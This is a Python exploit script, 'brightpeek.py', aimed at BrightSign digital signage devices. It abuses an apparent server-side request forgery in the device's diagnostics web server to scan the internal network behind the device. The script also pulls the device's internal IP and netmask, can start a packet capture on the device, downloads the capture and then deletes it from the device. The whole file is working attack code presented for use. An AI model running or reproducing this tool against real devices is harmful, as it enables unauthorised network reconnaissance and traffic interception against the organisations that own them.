#!/usr/bin/env python3
'''
    For probing internal network through BrightSign device SSRF in BrightSign Diagnostics Web Server
    Slow but steady :)
    Usage:
    ./brightpeek.py DEVICE_ADDRESS:DEVICE_PORT_NUMBER --pcap FILE_LOCATION
    
    Optional:
        --pcap FILE_LOCATION         Use Network Diagnostics packet capture and store PCAP locally to LOCATION
                                (Default location /tmp/capture.pcap)
'''

import sys
import requests
import ipaddress

VULN_ENDPOINT = 'speedtest?url='
INFO_ENDPOINT = 'netconfig.html?ref=diagnostics.html'
NETCAP_START_ENDPOINT = 'packet_capture.html?interface=any&file=bs.pcap&duration=0&maxpackets=0&snaplen=0&filter=&action=Start'
NETCAP_STOP_ENDPOINT = 'packet_capture.html?action=Stop'
PCAP_FILE_ENDPOINT = 'save?rp=sd/bs.pcap'
PCAP_DELETE_ENDPOINT = 'delete?filename=sd%2Fbs.pcap&delete=Delete'
PCAP_SAVE_LOCATION = '/tmp/capture.pcap'
IP_LINE = '<b>Current IP:</b> '
NET_LINE = '<b>Netmask:</b> '
TEST_PORTS = {1337}
REQ_HEAD = {
    'User-Agent': 'Mozilla/5.0 (OS/2; Warp 4.5; rv:31.0) Gecko/20100101 Firefox/31.0',   # for the lulz
    'Access-Control-Allow-Origin': '*',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Cookie': 'language=en; updateTips=true; enableAnonymous8888=false; enableAnonymous9988=false',
    'DNT': '1',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

ext_ip = None
ext_port = None
pcap = False
pcap_file = None

result_list = []
def print_results():
    print("Hosts located in scan:")
    for ip in result_list:
        print(f"{ip}")

def print_help():
    print("Usage:\nbrightpeek.py DEVICE_ADDRESS:DEVICE_PORT_NUMBER\n")

def check_args(args):
    global ext_ip
    global ext_port
    
    if (len(args) < 2):
        return 1

    if (len(args) > 4):
        print("Too many arguments")
        return 1

    if (len(args) >= 3):
        if (args[2] != '--pcap'):
            print("Invalid option.")
            return 1
        global pcap
        global pcap_file
        pcap = True
        try:
            pcap_file = args[3].strip()
        except:
            pcap_file = PCAP_SAVE_LOCATION

    if (len(args[1].split(':')) != 2):
        print("Invalid syntax")
        return 1
    
    ext_ip = args[1].split(':')[0]
    ext_port = 0

    try:
        ext_port = int(sys.argv[1].split(':')[1])
        if (ext_port < 0 or ext_port > 65535):
            raise Exception
    except Exception:
        print("Port needs to be a number in range: 0 - 65535")
        return 1
      
    return 0

# Collect network traffic through Network Diagnostics packet capturing
pcap_running = False
def pcap_collect(pcap_ctl):
    req_base = f"http://{ext_ip}:{ext_port}"
    req_headers = {
        'Host': ext_ip + ':' + str(ext_port)
    }
    req_headers.update(REQ_HEAD)
    
    # Start/Stop PCAP
    req_string = f"{req_base}/{NETCAP_START_ENDPOINT}" if pcap_ctl else f"{req_base}/{NETCAP_STOP_ENDPOINT}"
    try:
        response = requests.get(req_string, headers=req_headers)
    except Exception as e:
        print(f"Could not complete PCAP capture request : {e}")
        return 1

    # Save PCAP locally and delete from device
    if not pcap_ctl:
        req_string = f"{req_base}/{PCAP_FILE_ENDPOINT}"
        try:
            response = requests.get(req_string, headers=req_headers)
            try:
                global pcap_file
                with open(pcap_file, 'wb') as f:
                    f.write(response.content)
                print(f"Saved PCAP locally to {pcap_file}")
            except Exception as e:
                print(f"Could not save PCAP at location {pcap_file}")
        except Exception as e:
            print(f"Could not save PCAP file to {pcap_file}")
        
        req_string = f"{req_base}/{PCAP_DELETE_ENDPOINT}"
        try:
            response = requests.get(req_string, headers=req_headers)
            print("Deleting PCAP from device.")
        except Exception as e:
            print("Could not delete PCAP file from device at specified location.")
    
    return 0

def main(args):
    if check_args(args):
        print_help()
        exit(1)

    # Set up request specifics
    req_base = f"http://{ext_ip}:{ext_port}"
    req_headers = {
        'Host': ext_ip + ':' + str(ext_port),
    }
    req_headers.update(REQ_HEAD)
    
    # Get internal IP address of BrightSign device
    info_req = requests.get(f"{req_base}/{INFO_ENDPOINT}", headers=req_headers)
    info_split = info_req.content.split(b'\n')

    int_ip = None
    int_netmask = None

    for line in info_split:
        if IP_LINE in line.decode('utf-8'):
            int_ip = line.decode('utf-8').strip(IP_LINE).strip()
        if NET_LINE in line.decode('utf-8'):
            int_netmask = line.decode('utf-8').strip(NET_LINE).strip()

    if int_ip == '':
        print("Could not get internal IP address.")
        exit(1)
    if int_netmask == '':
        print("Could not get internal network address.")
        exit(1)

    # Get network of BrightSign device
    try:
        int_net = ipaddress.IPv4Network((int_ip, int_netmask), strict=False)
    except:
        print("Something went wrong. :( Could not calculate network CIDR.")
        exit(1)
        
    print(f"External:           {ext_ip}:{ext_port}")
    print(f"Internal IP:        {int_ip}")
    print(f"Internal Network:   {int_net}")

    if pcap:
        # Start network capture
        global pcap_running
        if not pcap_collect(True):
            print(f"Storing PCAP:       {pcap_file}")
            print("Started network capture.")
            pcap_running = True

    #Iterate through IP range
    print("Scanning (this may take a while)...")
    
    global result_list

    for ip in ipaddress.ip_network(int_net).hosts():
        for port in TEST_PORTS:
            print(f"Probing Host: {ip}:{port}", end='\r')
            req_string = f"{req_base}/{VULN_ENDPOINT}{ip}:{port}"
            response = None

            try:
                response = requests.get(req_string, headers=req_headers)
            except Exception as e:
                print(f"Could not complete request. : {e}")
                if (pcap_running):
                    pcap_collect(False)
                exit(1)
                
            if 'No route to host' not in response.text.strip():
                print("\r", end='')
                print(f"Hit: {ip}:{port} <-> {response.text.strip()}")

                result_list.append(ip)

if __name__ == '__main__':
    try:
        main(sys.argv)
    except KeyboardInterrupt:
        print("\n\nCtrl-C pressed, exiting.")
    
    if pcap_running:
        pcap_collect(False)
        
    print_results()
    print("Done.")
    